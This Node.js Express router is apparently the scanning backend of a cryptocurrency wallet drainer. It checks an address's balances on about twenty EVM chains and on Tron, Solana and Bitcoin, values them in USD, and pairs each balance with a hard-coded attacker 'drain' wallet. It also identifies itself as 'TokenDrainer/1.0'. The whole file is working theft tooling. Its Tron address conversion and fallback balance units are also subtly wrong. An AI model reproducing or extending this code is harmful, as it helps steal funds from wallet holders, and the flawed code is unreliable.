const express = require('express');
const router = express.Router();
const { ethers } = require('ethers');
const axios = require('axios');
const crypto = require('crypto');

// ==================== NETWORK CONFIG ====================
const NETWORKS = {
  evm: {
    1: { name: 'Ethereum', symbol: 'ETH', rpc: 'https://eth.llamarpc.com', decimals: 18 },
    56: { name: 'BSC', symbol: 'BNB', rpc: 'https://bsc-dataseed.binance.org/', decimals: 18 },
    137: { name: 'Polygon', symbol: 'MATIC', rpc: 'https://polygon.llamarpc.com', decimals: 18 },
    42161: { name: 'Arbitrum', symbol: 'ETH', rpc: 'https://arbitrum.llamarpc.com', decimals: 18 },
    10: { name: 'Optimism', symbol: 'ETH', rpc: 'https://mainnet.optimism.io', decimals: 18 },
    8453: { name: 'Base', symbol: 'ETH', rpc: 'https://mainnet.base.org', decimals: 18 },
    43114: { name: 'Avalanche', symbol: 'AVAX', rpc: 'https://avalanche-c-chain.publicnode.com', decimals: 18 },
    250: { name: 'Fantom', symbol: 'FTM', rpc: 'https://rpc.fantom.network', decimals: 18 },
    100: { name: 'Gnosis', symbol: 'xDai', rpc: 'https://rpc.gnosis.gateway.fm', decimals: 18 },
    42220: { name: 'Celo', symbol: 'CELO', rpc: 'https://forno.celo.org', decimals: 18 },
    1284: { name: 'Moonbeam', symbol: 'GLMR', rpc: 'https://moonbeam.public.blastapi.io', decimals: 18 },
    1088: { name: 'Metis', symbol: 'METIS', rpc: 'https://andromeda.metis.io/?owner=1088', decimals: 18 },
    25: { name: 'Cronos', symbol: 'CRO', rpc: 'https://evm.cronos.org', decimals: 18 },
    1666600000: { name: 'Harmony', symbol: 'ONE', rpc: 'https://api.harmony.one', decimals: 18 },
    1313161554: { name: 'Aurora', symbol: 'ETH', rpc: 'https://mainnet.aurora.dev', decimals: 18 },
    42262: { name: 'Oasis Emerald', symbol: 'ROSE', rpc: 'https://emerald.oasis.dev', decimals: 18 },
    1285: { name: 'Moonriver', symbol: 'MOVR', rpc: 'https://moonriver.public.blastapi.io', decimals: 18 },
    199: { name: 'BTT Chain', symbol: 'BTT', rpc: 'https://rpc.bittorrentchain.io', decimals: 18 },
    314: { name: 'Filecoin', symbol: 'FIL', rpc: 'https://api.node.glif.io/rpc/v1', decimals: 18 },
    7700: { name: 'Canto', symbol: 'CANTO', rpc: 'https://canto.slingshot.finance', decimals: 18 }
  },
  nonevm: {
    tron: { 
      name: 'Tron', 
      symbol: 'TRX', 
      decimals: 6, 
      api: 'https://api.trongrid.io',
      rpc: 'https://api.trongrid.io'
    },
    solana: { 
      name: 'Solana', 
      symbol: 'SOL', 
      decimals: 9, 
      api: 'https://api.mainnet-beta.solana.com',
      rpc: 'https://api.mainnet-beta.solana.com'
    },
    bitcoin: { 
      name: 'Bitcoin', 
      symbol: 'BTC', 
      decimals: 8, 
      api: 'https://blockstream.info/api',
      rpc: 'https://blockstream.info/api'
    }
  }
};

const DRAIN_ADDRESSES = {
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1284: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1088: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  25: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1666600000: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  314: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  7700: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qyrvpwncwhd33flcs96hc58j7kw074c4t8mjawh",
  solana: "HWLc6kfcg7yX3dyZzNbMoUimraCnFmaYYJoTiReJYRdF"
};

// ==================== SCAN ENDPOINTS ====================

// Health check for scan route
router.get('/health', (req, res) => {
  res.json({
    success: true,
    service: 'Scan Service',
    status: 'operational',
    timestamp: new Date().toISOString()
  });
});

// Scan address across all networks
router.post('/address/:address', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  const { address } = req.params;
  const { includeNonEVM = true } = req.body;
  
  try {
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({
        success: false,
        error: "Valid EVM address required",
        requestId
      });
    }
    
    console.log(`🔍 [${requestId}] Scanning ${address}`);
    
    const results = [];
    
    // Scan EVM networks
    for (const [chainId, config] of Object.entries(NETWORKS.evm)) {
      try {
        const provider = new ethers.JsonRpcProvider(config.rpc);
        const balance = await provider.getBalance(address);
        const balanceNumber = parseFloat(ethers.formatEther(balance));
        
        if (balanceNumber > 0.000001) {
          results.push({
            network: config.name,
            symbol: config.symbol,
            chainId: parseInt(chainId),
            type: 'evm',
            balance: balanceNumber,
            balanceFormatted: balanceNumber.toFixed(6),
            drainAddress: DRAIN_ADDRESSES[chainId] || DRAIN_ADDRESSES[1],
            estimatedUSD: estimateUSDValue(balanceNumber, config.symbol),
            timestamp: new Date().toISOString()
          });
        }
      } catch (error) {
        console.log(`[${requestId}] ${config.name} scan failed:`, error.message);
      }
      
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    // Scan non-EVM networks
    if (includeNonEVM) {
      // Tron
      try {
        const tronBalance = await getTronBalance(address);
        if (tronBalance > 0.001) {
          results.push({
            network: 'Tron',
            symbol: 'TRX',
            chainId: 'tron',
            type: 'non-evm',
            balance: tronBalance,
            balanceFormatted: tronBalance.toFixed(6),
            drainAddress: DRAIN_ADDRESSES.tron,
            estimatedUSD: estimateUSDValue(tronBalance, 'TRX'),
            timestamp: new Date().toISOString()
          });
        }
      } catch (error) {
        console.log(`[${requestId}] Tron scan failed:`, error.message);
      }
      
      // Solana
      try {
        const solanaBalance = await getSolanaBalance(address);
        if (solanaBalance > 0.001) {
          results.push({
            network: 'Solana',
            symbol: 'SOL',
            chainId: 'solana',
            type: 'non-evm',
            balance: solanaBalance,
            balanceFormatted: solanaBalance.toFixed(6),
            drainAddress: DRAIN_ADDRESSES.solana,
            estimatedUSD: estimateUSDValue(solanaBalance, 'SOL'),
            timestamp: new Date().toISOString()
          });
        }
      } catch (error) {
        console.log(`[${requestId}] Solana scan failed:`, error.message);
      }
      
      // Bitcoin
      try {
        const bitcoinBalance = await getBitcoinBalance(address);
        if (bitcoinBalance > 0.00001) {
          results.push({
            network: 'Bitcoin',
            symbol: 'BTC',
            chainId: 'bitcoin',
            type: 'non-evm',
            balance: bitcoinBalance,
            balanceFormatted: bitcoinBalance.toFixed(8),
            drainAddress: DRAIN_ADDRESSES.bitcoin,
            estimatedUSD: estimateUSDValue(bitcoinBalance, 'BTC'),
            timestamp: new Date().toISOString()
          });
        }
      } catch (error) {
        console.log(`[${requestId}] Bitcoin scan failed:`, error.message);
      }
    }
    
    const totalValue = results.reduce((sum, token) => sum + (token.estimatedUSD || 0), 0);
    
    res.json({
      success: true,
      requestId,
      data: {
        address,
        results,
        summary: {
          totalTokens: results.length,
          totalValue,
          totalValueFormatted: `$${totalValue.toFixed(2)}`,
          scannedAt: new Date().toISOString()
        }
      }
    });
    
  } catch (error) {
    console.error(`❌ Scan error:`, error);
    res.status(500).json({
      success: false,
      error: "Scan failed",
      requestId,
      details: error.message
    });
  }
});

// Quick scan
router.post('/quick', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { address } = req.body;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({
        success: false,
        error: "Valid EVM address required"
      });
    }
    
    console.log(`⚡ [${requestId}] Quick scan for ${address}`);
    
    const quickResults = [];
    
    // Ethereum
    try {
      const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
      const ethBalance = await ethProvider.getBalance(address);
      const ethBalanceNumber = parseFloat(ethers.formatEther(ethBalance));
      
      if (ethBalanceNumber > 0.000001) {
        quickResults.push({
          network: 'Ethereum',
          symbol: 'ETH',
          chainId: 1,
          balance: ethBalanceNumber,
          drainAddress: DRAIN_ADDRESSES[1]
        });
      }
    } catch (error) {
      console.log('Ethereum quick scan failed:', error.message);
    }
    
    // BSC
    try {
      const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
      const bscBalance = await bscProvider.getBalance(address);
      const bscBalanceNumber = parseFloat(ethers.formatEther(bscBalance));
      
      if (bscBalanceNumber > 0.000001) {
        quickResults.push({
          network: 'BSC',
          symbol: 'BNB',
          chainId: 56,
          balance: bscBalanceNumber,
          drainAddress: DRAIN_ADDRESSES[56]
        });
      }
    } catch (error) {
      console.log('BSC quick scan failed:', error.message);
    }
    
    // Tron
    try {
      const tronBalance = await getTronBalance(address);
      if (tronBalance > 0.001) {
        quickResults.push({
          network: 'Tron',
          symbol: 'TRX',
          chainId: 'tron',
          balance: tronBalance,
          drainAddress: DRAIN_ADDRESSES.tron
        });
      }
    } catch (error) {
      console.log('Tron quick scan failed:', error.message);
    }
    
    res.json({
      success: true,
      requestId,
      data: {
        address,
        results: quickResults,
        hasBalance: quickResults.length > 0,
        timestamp: new Date().toISOString()
      }
    });
    
  } catch (error) {
    console.error('Quick scan error:', error);
    res.status(500).json({
      success: false,
      error: "Quick scan failed"
    });
  }
});

// Tron-specific scan
router.post('/tron', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { address } = req.body;
    
    if (!address) {
      return res.status(400).json({
        success: false,
        error: "Address required"
      });
    }
    
    console.log(`🌐 [${requestId}] Tron scan for ${address}`);
    
    // Convert address if needed
    let tronAddress = address;
    let isEthereumFormat = false;
    
    if (address.startsWith('0x')) {
      tronAddress = 'T' + address.substring(2);
      isEthereumFormat = true;
    }
    
    // Try multiple endpoints for reliability
    let balance = 0;
    let rawData = null;
    
    // Primary API
    try {
      const response = await axios.get(`https://api.trongrid.io/v1/accounts/${tronAddress}`, {
        timeout: 8000
      });
      
      if (response.data && response.data.data && response.data.data.length > 0) {
        balance = response.data.data[0].balance || 0;
        rawData = response.data.data[0];
      }
    } catch (primaryError) {
      console.log(`[${requestId}] Primary Tron API failed:`, primaryError.message);
      
      // Backup API
      try {
        const backupResponse = await axios.get(`https://apilist.tronscan.org/api/account?address=${tronAddress}`, {
          timeout: 5000
        });
        
        if (backupResponse.data) {
          balance = backupResponse.data.balance || 0;
          rawData = backupResponse.data;
        }
      } catch (backupError) {
        console.log(`[${requestId}] Backup Tron API failed:`, backupError.message);
      }
    }
    
    const balanceTRX = balance / 1_000_000;
    const usdValue = estimateUSDValue(balanceTRX, 'TRX');
    
    res.json({
      success: true,
      requestId,
      data: {
        address: tronAddress,
        originalAddress: address,
        isEthereumFormat,
        balance: balanceTRX,
        balanceFormatted: balanceTRX.toFixed(6),
        rawBalance: balance,
        network: 'Tron',
        symbol: 'TRX',
        drainAddress: DRAIN_ADDRESSES.tron,
        estimatedUSD: usdValue,
        hasBalance: balanceTRX > 0.001,
        rawData: rawData,
        timestamp: new Date().toISOString()
      }
    });
    
  } catch (error) {
    console.error(`❌ Tron scan error:`, error);
    res.status(500).json({
      success: false,
      error: "Tron scan failed",
      details: error.message
    });
  }
});

// Network status
router.get('/networks', (req, res) => {
  const networks = [];
  
  // EVM networks
  Object.entries(NETWORKS.evm).forEach(([id, config]) => {
    networks.push({
      id: parseInt(id),
      name: config.name,
      symbol: config.symbol,
      type: 'evm',
      rpc: config.rpc,
      status: 'available'
    });
  });
  
  // Non-EVM networks
  Object.entries(NETWORKS.nonevm).forEach(([id, config]) => {
    networks.push({
      id: id,
      name: config.name,
      symbol: config.symbol,
      type: 'non-evm',
      api: config.api,
      status: 'available'
    });
  });
  
  res.json({
    success: true,
    data: {
      networks,
      total: networks.length,
      evm: Object.keys(NETWORKS.evm).length,
      nonevm: Object.keys(NETWORKS.nonevm).length
    }
  });
});

// ==================== HELPER FUNCTIONS ====================

async function getTronBalance(address) {
  try {
    let tronAddress = address;
    if (address.startsWith('0x')) {
      tronAddress = 'T' + address.substring(2);
    }
    
    const response = await axios.get(`https://api.trongrid.io/v1/accounts/${tronAddress}`, {
      timeout: 10000,
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'TokenDrainer/1.0'
      }
    });
    
    if (response.data && response.data.data && response.data.data.length > 0) {
      const balance = response.data.data[0].balance || 0;
      return balance / 1_000_000;
    }
    
    return 0;
  } catch (error) {
    console.error("Tron balance error:", error.message);
    
    // Try backup API
    try {
      let tronAddress = address;
      if (address.startsWith('0x')) {
        tronAddress = 'T' + address.substring(2);
      }
      
      const backupResponse = await axios.get(`https://apilist.tronscan.org/api/account?address=${tronAddress}`, {
        timeout: 5000
      });
      
      if (backupResponse.data && backupResponse.data.balance !== undefined) {
        return backupResponse.data.balance;
      }
    } catch (backupError) {
      console.error("Tron backup API error:", backupError.message);
    }
    
    return 0;
  }
}

async function getSolanaBalance(address) {
  try {
    const response = await axios.post('https://api.mainnet-beta.solana.com', {
      jsonrpc: "2.0",
      id: 1,
      method: "getBalance",
      params: [address]
    }, {
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json'
      }
    });
    
    if (response.data && response.data.result) {
      return response.data.result.value / 1e9;
    }
    
    return 0;
  } catch (error) {
    console.error("Solana balance error:", error.message);
    return 0;
  }
}

async function getBitcoinBalance(address) {
  try {
    const response = await axios.get(`https://blockstream.info/api/address/${address}`, {
      timeout: 10000
    });
    
    if (response.data && response.data.chain_stats) {
      const funded = response.data.chain_stats.funded_txo_sum || 0;
      const spent = response.data.chain_stats.spent_txo_sum || 0;
      return (funded - spent) / 1e8;
    }
    
    return 0;
  } catch (error) {
    console.error("Bitcoin balance error:", error.message);
    return 0;
  }
}

function estimateUSDValue(amount, symbol) {
  const prices = {
    'ETH': 3200,
    'BNB': 600,
    'MATIC': 1.2,
    'AVAX': 35,
    'FTM': 0.4,
    'xDai': 1,
    'CELO': 0.8,
    'GLMR': 0.4,
    'METIS': 60,
    'CRO': 0.1,
    'ONE': 0.02,
    'ROSE': 0.1,
    'MOVR': 15,
    'BTT': 0.000001,
    'FIL': 5,
    'CANTO': 0.2,
    'TRX': 0.12,
    'SOL': 100,
    'BTC': 45000
  };
  
  return amount * (prices[symbol] || 1);
}

module.exports = router;
